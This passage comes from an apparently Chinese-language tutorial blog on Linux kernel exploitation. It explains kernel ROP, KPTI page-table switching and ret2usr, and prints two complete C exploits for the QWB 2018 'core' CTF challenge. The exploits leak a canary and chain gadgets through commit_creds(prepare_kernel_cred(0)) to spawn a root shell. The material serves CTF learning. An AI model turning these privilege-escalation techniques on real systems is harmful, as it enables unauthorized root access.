class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0</span>, prepare_kernel_cred = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;[+] Successful to get the root. Execve root shell now...&quot;</span><br>         <span class="hljs-string">&quot;\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off_val</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    FILE *ksyms_file;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">size_t</span> offset, canary;<br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    save_status();<br><br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    ksyms_file = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ksyms_file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(ksyms_file, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>)) &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of commit_cread:&quot;</span><br>        	   <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>)) &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m&quot;</span><br>                   <span class="hljs-string">&quot;[+] Successful to get the addr of prepare_kernel_cred:&quot;</span><br>        	   <span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    set_off_val(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>;i++) &#123;<br>        rop_chain[i] = canary;<br>    &#125;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// clear useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    core_copy(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译指令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc ./exploit.c -o exploit -static -masm=intel</span><br></code></pre></td></tr></table></figure>

<p>本地调试的话重新打包即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">find . | cpio -o -H newc &gt; ../core.cpio</span><br></code></pre></td></tr></table></figure>

<p>运行即可获得root shell</p>
<p><img src="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="返回用户态-with-KPTI-bypass"><a href="#返回用户态-with-KPTI-bypass" class="headerlink" title="返回用户态 with KPTI bypass"></a>返回用户态 with KPTI bypass</h2><p>对于开启了 KPTI（内核页表隔离），我们<strong>不能像之前那样直接 swapgs ; iret 返回用户态</strong>，而是在返回用户态之前还<strong>需要将用户进程的页表给切换回来</strong></p>
<p>众所周知 Linux 采用<strong>四级页表</strong>结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</strong></p>
<p><img src="https://i.loli.net/2021/09/10/Rm8Ti9MpVUZ7fPK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射</strong>，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局</p>
<p><strong>KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式</strong></p>
<blockquote>
<p>在 64 位下用户空间与内核空间都占 128 TB，所以他们占用的页全局表项（PGD）的大小应当是相同的，图上没有体现出来，因此这里由笔者代为补充说明（笑）</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>笔者以前学习 KPTI 时看了一篇某乎上的文章说是用户空间一张页表，内核空间一张页表，<strong>实现完整的隔离</strong>，笔者一度信以为真，后面想想不对劲，<strong>如果用户空间与内核空间真是完全隔离的话他们之间甚至无法进行数据交换，因此必定在某个节点上同时存在着完整的对用户空间与内核空间的映射</strong>，这个节点就是当 CPU 运行在内核态时</p>
</blockquote>
<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 <code>arch/x86/entry/entry_64.S</code> 中提供了一个用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得</p>
<p>源码的 AT&amp;T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果（亲切的 Intel 风格）：</p>
<p><img src="https://i.loli.net/2021/09/10/FpymLdwJMnRU4hi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在实际操作时前面的一些栈操作都可以跳过，直接从 <code>mov rdi, rsp</code> 开始，这个函数大概可以总结为如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov  rdi, cr3<br>or rdi, 0x1000<br>mov  cr3, rdi<br>pop rax<br>pop rdi<br>swapgs<br>iretq<br></code></pre></td></tr></table></figure>

<p>因此我们只需要布置出如下栈布局即可：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">↓   swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure>

<p>我们同时也可以看出这是一个极好的用来进行调栈的函数</p>
<blockquote>
<p>KPTI bypass 这里就不放例题了，因为和前面的返回用户态而言仅有 gadget 以及栈布局上的微小差别</p>
</blockquote>
<h1 id="0x02-Kernel-ROP-ret2usr"><a href="#0x02-Kernel-ROP-ret2usr" class="headerlink" title="0x02.Kernel ROP - ret2usr"></a>0x02.Kernel ROP - ret2usr</h1><p><strong>在【未】开启SMAP&#x2F;SMEP保护的情况下</strong>，用户空间无法访问内核空间的数据，但是内核空间可以访问&#x2F;执行用户空间的数据，因此 ret2usr 这种攻击手法应运而生——通过 kernel ROP 以内核的 ring 0 权限执行用户空间的代码以完成提权</p>
<p>通常 CTF 中的 ret2usr 还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可</p>
<p>✳ 对于开启了<code>SMAP/SMEP保护</code>的 kernel 而言，<strong>内核空间尝试直接访问用户空间会引起 kernel panic</strong></p>
<blockquote>
<p>通常情况下的报错信息大概如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[    7.168919] unable to execute userspace code (SMEP?) (uid: 1000)<br>[    7.170547] BUG: unable to handle kernel paging request at 0000000000401d8a<br>[    7.171399] IP: 0x401d8a<br>[    7.171598] PGD 800000000fb5e067 P4D 800000000fb5e067 PUD fb5f067 PMD fb59065<br>[    7.172087] Oops: 0011 [#1] SMP PTI<br>// 调用栈回溯<br>[    7.186319] Kernel panic - not syncing: Fatal exception<br>[    7.187391] Kernel Offset: 0x32800000 from 0xffffffff81000000 (relocation ra)<br>[    7.188504] Rebooting in 1 seconds.. <br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="例题：强网杯2018-core-1"><a href="#例题：强网杯2018-core-1" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><blockquote>
<p>好像也找不到别的纯 ret2usr 的题了，kernel pwn 的题太少了…<del>但是你又⑧能⑧学</del></p>
</blockquote>
<p>具体的这里就不再重复分析了，由于其未开启 smap&#x2F;smep 保护，故可以考虑在<strong>用户地址空间中构造好对应的函数指针后直接 ret2usr 以提权</strong>，我们只需要将代码稍加修改即可</p>
<p>最终的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreRead</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setOffValue</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-type">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>重新打包，运行，成功获取root权限</p>
<p><img src="https://i.loli.net/2021/03/10/ZJr5aWSmlBM8AXt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
